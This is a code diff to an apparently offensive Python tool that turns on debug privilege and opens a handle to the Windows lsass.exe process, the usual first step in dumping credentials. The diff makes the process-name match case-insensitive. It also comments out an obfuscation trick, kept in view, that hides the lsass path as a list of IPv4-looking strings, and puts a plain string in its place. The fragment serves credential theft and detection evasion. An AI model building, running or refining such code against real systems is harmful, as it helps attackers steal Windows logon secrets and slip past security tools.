@@ -185,7 +185,7 @@ def GetProcessByName(proc_name):
             break
         try:
             aux_proc_name = get_proc_name_from_handle(aux_handle)
-            if aux_proc_name == proc_name:
+            if aux_proc_name.lower() == proc_name.lower():
                 return aux_handle
         except Exception as e:
             pass
@@ -316,8 +316,9 @@ def main():
     enable_debug_privilege()
 
     # Decode process name to "C:\\WINDOWS\\system32\\lsass.exe"
-    process_name_ipv4_encoded  = ["67.58.92.87", "73.78.68.79", "87.83.92.115", "121.115.116.101", "109.51.50.92", "108.115.97.115", "115.46.101.120", "101.0.0.0"]
-    process_name = decodeIPv4(process_name_ipv4_encoded)
+    # process_name_ipv4_encoded  = ["67.58.92.87", "73.78.68.79", "87.83.92.115", "121.115.116.101", "109.51.50.92", "108.115.97.115", "115.46.101.120", "101.0.0.0"]
+    # process_name = decodeIPv4(process_name_ipv4_encoded)
+    process_name = "c:\\windows\\system32\\lsass.exe"
     
     # Get process handle
     process_handle = GetProcessByName(process_name)
